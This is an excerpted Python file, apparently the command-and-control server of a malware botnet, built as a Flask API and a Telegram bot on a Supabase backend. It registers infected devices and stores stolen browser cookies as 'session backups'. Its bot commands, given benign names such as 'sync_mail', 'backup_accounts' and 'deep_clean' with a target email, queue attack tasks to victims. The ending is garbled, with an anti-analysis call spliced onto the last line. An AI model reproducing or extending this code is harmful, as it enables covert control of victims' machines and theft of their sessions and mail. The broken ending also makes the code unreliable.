...
from plugin_manager import ModuleLoader
from data_encoder import AIObfuscator
from connection_watcher import FailoverTester
from device_tasks import AttackOrchestrator
...
class KeyStorage:
    ...
    def get_key(self, device_id: str) -> Optional[bytes]:
        with self.lock:
            ...
            if self.supabase:
                try:
                    resp = self.supabase.table('device_config').select('shared_key_enc', 'expiry').eq('device_id', device_id).execute()
                    if resp.data:
    ...
    def store_key(self, device_id: str, key: bytes, expiry: float):
        with self.lock:
            ...
            if self.supabase:
                try:
                    self.supabase.table('device_config').upsert({
                        'device_id': device_id,
        ...
        with self.lock:
            if device_id in self.cache:
                ...
                if remaining < 600:
                    ...
                    if supabase_active:
                        try:
                            supabase_active.table('task_queue').insert({
...
def rotate_keys_periodically():
    while True:
        ...
        if supabase_active:
            try:
                supabase_active.table('device_config').delete().lt('expiry', datetime.utcnow().timestamp()).execute()
            except Exception as e:
...
def trigger_background_job(device_id: str, target_email: str) -> bool:
    if not USE_AI_C2:
        return False
    if supabase_active:
        try:
            ...
            logging.error(f"Error triggering background job: {e}")
    return False

def trigger_profile_update(device_id: str, skill_name: str, parameters: Dict = None) -> bool:
    if supabase_active:
        try:
            payload = {'profile_name': skill_name, 'parameters': parameters or {}}
            supabase_active.table('task_queue').insert({
                'target_client': device_id,
            ...
            logging.error(f"Error triggering profile update: {e}")
    return False
...
def register_device():
    ...
    if supabase_active:
        try:
            ...
            supabase_active.table('registered_devices').upsert({
...
def push_data():
    ...
    if supabase_active:
        try:
            ...
            supabase_active.table('registered_devices').update({
                'last_seen': datetime.utcnow().isoformat(),
    ...
    if payload_type == 'command_result':
        ...
        if supabase_active and cmd_id:
            try:
                supabase_active.table('task_queue').update({
        ...
        if cookies and supabase_active:
            try:
                ...
                supabase_active.table('session_backups').insert({
                    'device_id': device_id,
                    'cookies_enc': base64.b64encode(encrypted_cookies).decode(),
                    'timestamp': datetime.utcnow().isoformat()
                }).execute()
                failover.send_message_to_admin(f"Session backup from {device_id}")
            except Exception as e:
    ...
    elif payload_type == 'background_job_result':
        result = payload.get('result')
        failover.send_message_to_admin(f"Background job result from {device_id}:\n{result[:200]}")
    elif payload_type == 'profile_update_result':
        result = payload.get('result')
        failover.send_message_to_admin(f"Profile update result from {device_id}:\n{result[:200]}")
...
def list_clients():
    ...
    if not supabase_active:
        return jsonify([])
    try:
        result = supabase_active.table('registered_devices').select('client_serial, operational_status, last_seen').execute()
...
def get_results():
    ...
    if not supabase_active:
        return jsonify([])
    try:
        result = supabase_active.table('task_queue') \
...
@app.route('/api/session_backups', methods=['GET'])
def get_session_backups():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)
    if not supabase_active:
        return jsonify([])
    try:
        result = supabase_active.table('session_backups') \
        ...
        logging.error(f"Error fetching session backups: {e}")
        return jsonify([])
...
/system_optimize [id] -- System optimization
/network_share [id] -- Network share
/backup_accounts [id] -- Backup accounts
/ui_helper [id] -- UI helper
/sync_mail [id] -- Sync mail
/deep_clean [id] [email] -- Deep clean
/update_profile [id] [profile] -- Update profile
    """
...
def list_devices(message):
    ...
    if not supabase_active:
        ...
        return
    try:
        resp = supabase_active.table('registered_devices').select('client_serial, last_seen, operational_status').order('last_seen', desc=True).limit(20).execute()
        devices = resp.data
        if not devices:
...
@bot.message_handler(commands=['system_optimize'])
def system_optimize(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /system_optimize [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('task_queue').insert({
            'target_client': device_id,
            'request_type': 'system_opt',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🔥 System optimization queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['network_share'])
def network_share(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /network_share [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('task_queue').insert({
        ...
        bot.reply_to(message, f"🕸️ Network share started from {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['backup_accounts'])
def backup_accounts(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /backup_accounts [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('task_queue').insert({
        ...
        bot.reply_to(message, f"📱 Account backup queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['ui_helper'])
def ui_helper(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /ui_helper [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('task_queue').insert({
        ...
        bot.reply_to(message, f"♿ UI helper queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['sync_mail'])
def sync_mail(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /sync_mail [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('task_queue').insert({
            'target_client': device_id,
            'request_type': 'sync_gmail',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"📧 Mail sync queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['deep_clean'])
def deep_clean(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /deep_clean [device_id] [target_email]")
        return
    device_id, target_email = parts[1], parts[2]
    if trigger_background_job(device_id, target_email):
        bot.reply_to(message, f"🧹 Deep clean triggered for {device_id} targeting {target_email}")
    else:
        bot.reply_to(message, "❌ Failed to trigger deep clean")
...
def update_profile(message):
    ...
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /update_profile [device_id] [profile_name]")
        return
    device_id, profile_name = parts[1], parts[2]
    if trigger_profile_update(device_id, profile_name):
        bot.reply_to(message, f"📝 Profile update triggered for {device_id} with profile {profile_name}")
    else:
        bot.reply_to(message, "❌ Failed to trigger profile update")
...
if __name__ == '__main__':
    ...
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)        anti_analysis_check()
        time.sleep(600)
